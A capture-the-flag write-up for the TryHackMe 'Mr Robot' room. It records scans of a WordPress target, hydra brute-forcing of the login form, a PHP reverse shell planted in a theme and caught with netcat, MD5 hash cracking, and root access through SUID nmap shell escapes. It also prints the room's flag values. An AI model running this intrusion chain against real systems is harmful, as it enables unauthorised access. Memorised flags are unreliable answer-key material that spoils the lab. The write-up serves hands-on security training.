MR ROBOT
========


ENUMERATION
===========

NMAP
====


```


┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/MR robot]
└─$ sudo nmap -sC -sV -A -p- -Pn --min-rate 2000 $IP -oN nmap.md
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-19 03:56 EDT
Stats: 0:03:24 elapsed; 0 hosts completed (1 up), 1 undergoing Traceroute
Traceroute Timing: About 32.26% done; ETC: 03:59 (0:00:00 remaining)
Nmap scan report for 10.10.135.199
Host is up (0.63s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
443/tcp open   ssl/http Apache httpd
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-server-header: Apache
Aggressive OS guesses: HP ProCurve MSM422 WAP (93%), DD-WRT v23 (Linux 2.4.36) (92%), MikroTik RouterOS 5.25 (Linux 2.6.35) (92%), Netgear ReadyNAS Duo NAS device (RAIDiator 4.1.4) (92%), Tomato 1.27 - 1.28 (Linux 2.4.20) (91%), MikroTik RouterOS 6.15 (Linux 3.3.5) (91%), Linux 2.4.21 - 2.4.25 (embedded) (90%), Fortinet FortiGate 100D firewall (90%), Fortinet FortiGate 1500D firewall (90%), Lexmark Z2400 printer (89%)                                                                                
No exact OS matches for host (test conditions non-ideal).                                                                                                              
Network Distance: 2 hops                                                                                                                                               
                                                                                                                                                                       
TRACEROUTE (using port 22/tcp)                                                                                                                                         
HOP RTT       ADDRESS                                                                                                                                                  
1   171.23 ms 10.11.0.1                                                                                                                                                
2   194.64 ms 10.10.135.199                                                                                                                                            
                                                                                                                                                                       
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                  
Nmap done: 1 IP address (1 host up) scanned in 238.36 seconds                                                                                                          
                                                               



```

WEB ENUMERATION
===============


```


FEROXBUSTER
===========

[>-------------------] - 3m      1464/29999   7/s     http://10.10.135.199/ 
[>-------------------] - 3m      1381/29999   7/s     http://10.10.135.199/blog 
[>-------------------] - 3m      1385/29999   7/s     http://10.10.135.199/js 
[>-------------------] - 3m      1359/29999   7/s     http://10.10.135.199/wp-content 
[>-------------------] - 3m      1356/29999   7/s     http://10.10.135.199/wp-includes 
[>-------------------] - 3m      1362/29999   7/s     http://10.10.135.199/css 
[>-------------------] - 3m      1342/29999   7/s     http://10.10.135.199/images 
[>-------------------] - 3m      1353/29999   7/s     http://10.10.135.199/admin 
[>-------------------] - 3m      1357/29999   7/s     http://10.10.135.199/wp-admin 
[>-------------------] - 3m      1349/29999   7/s     http://10.10.135.199/feed 
[>-------------------] - 3m      1281/29999   6/s     http://10.10.135.199/wp-content/themes 
[>-------------------] - 3m      1252/29999   6/s     http://10.10.135.199/wp-content/plugins 
[>-------------------] - 3m      1257/29999   6/s     http://10.10.135.199/wp-includes/images 
[>-------------------] - 3m      1270/29999   6/s     http://10.10.135.199/wp-includes/js 
[>-------------------] - 3m      1280/29999   6/s     http://10.10.135.199/wp-includes/css 
[>-------------------] - 3m      1254/29999   6/s     http://10.10.135.199/admin/images 
[>-------------------] - 3m      1255/29999   6/s     http://10.10.135.199/admin/css 
[>-------------------] - 3m      1250/29999   6/s     http://10.10.135.199/blog/feed 
[>-------------------] - 3m      1302/29999   7/s     http://10.10.135.199/wp-admin/user 
[>-------------------] - 3m      1250/29999   6/s     http://10.10.135.199/js/feed 
[>-------------------] - 3m      1250/29999   6/s     http://10.10.135.199/wp-admin/css 
[>-------------------] - 3m      1250/29999   6/s     http://10.10.135.199/css/feed 
[>-------------------] - 3m      1308/29999   7/s     http://10.10.135.199/video 
[>-------------------] - 3m      1302/29999   7/s     http://10.10.135.199/wp-content/feed 
[>-------------------] - 2m      1200/29999   6/s     http://10.10.135.199/wp-content/uploads



```

WPSCAN
======
```



                                                                                                                                                                       
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/MR robot]
└─$ wpscan --url http://10.10.135.199/ -e vp vt dbe u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.20
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]yes
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://10.10.135.199/ [10.10.135.199]
[+] Started: Sat Mar 19 04:16:45 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache
 |  - X-Mod-Pagespeed: 1.9.32.3-4523
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://10.10.135.199/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.135.199/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] The external WP-Cron seems to be enabled: http://10.10.135.199/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.135.199/fa43cd1.html, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.3.1'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.135.199/fa43cd1.html, Match: 'WordPress 4.3.1'

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.10.135.199/wp-content/themes/twentyfifteen/
 | Last Updated: 2022-01-25T00:00:00.000Z
 | Readme: http://10.10.135.199/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 3.1
 | Style URL: http://10.10.135.199/wp-content/themes/twentyfifteen/style.css?ver=4.3.1
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.135.199/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: 'Version: 1.3'

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Mar 19 04:17:05 2022
[+] Requests Done: 42
[+] Cached Requests: 6
[+] Data Sent: 9.366 KB
[+] Data Received: 11.79 MB
[+] Memory used: 235.191 MB
[+] Elapsed time: 00:00:19






```
http://10.10.135.199/robots.txt
===============================

```




User-agent: *
fsocity.dic
key-1-of-3.txt



```

fsocity.dic
===========

```

FOUND wordlist of some sort





```

http://10.10.135.199/key-1-of-3.txt
===================================
```

073403c8a58a1f80d943455fb30724b9


```

WP-ADMIN
========

```

WE CAN BRUTE FORCE THE USERNAME AND PASSWORD FOR THE ADMIN PAGE 

COMMAND = 'hydra -l Elliot -P fsocity.dic $IP -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location''


ER28–0652


```

LOGIN IN AND GET THE REVERSE SHELL
====================================
```

ADDED A PHP_REV_SHELL in PAGE NOT FOUND THEME

                                                                                                                                                                                              
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/MR robot]
└─$ nc -lnvp 1234             
listening on [any] 1234 ...
connect to [10.11.61.80] from (UNKNOWN) [10.10.135.199] 49542
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 09:57:22 up  2:03,  0 users,  load average: 0.00, 0.47, 2.66
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
$ ls  
bin
boot
dev
etc
home
initrd.img
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
vmlinuz


```

PRIV-ESC-TO MR-ROBOT
=====================
```


FOUNDED A HASH IN MR-ROBOT HOME


drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
$ cat password.raw-md5
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
$ 

CRACKING THE HASH

"

c3fcd3d76192e4007dfb496cca67e13b	md5	abcdefghijklmnopqrstuvwxyz

"
SWITCH USER


""

$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:~$ 



""

```


KEY-2-of-3.txt
==============

```


robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
robot@linux:~$ 


```

PRIV-ESC TO ROOT
================
```



SUDO IS NOT ALLOWED FOR ROBOT TO RUN


LETS RUN LINPEAS TO ENUMERATE FURTHER

-rwsr-xr-x 1 root root 493K Nov 13  2015 /usr/local/bin/nmap

THAT'S WEIRED


GTFO.BINS

""

SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

    The payload appears inside the regular nmap output.

    sudo install -m =xs $(which nmap) .

    LFILE=file_to_write
    /usr/local/bin/nmap -oG=$LFILE DATA



""

""




Limited SUID

If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

    Input echo is disabled.

    sudo install -m =xs $(which nmap) .

    TF=$(mktemp)
    echo 'os.execute("/bin/sh")' > $TF
    /usr/local/bin/nmap --script=$TF



Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

    Input echo is disabled.

    TF=$(mktemp)
    echo 'os.execute("/bin/sh")' > $TF
    nmap --script=$TF

    The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.

    nmap --interactive
    nmap> !sh



""

GOT ROOT

"

robot@linux:/opt/bitnami/stats$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> nmap> !sh
nmap> !sh
Unknown command (nmap>) -- press h <enter> for help
nmap> !sh
!sh
# id
id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
# 
# cd /root
cd /root
# ls
ls
firstboot_done  key-3-of-3.txt
# cat key-3-of-3.txt
cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
# 



"


```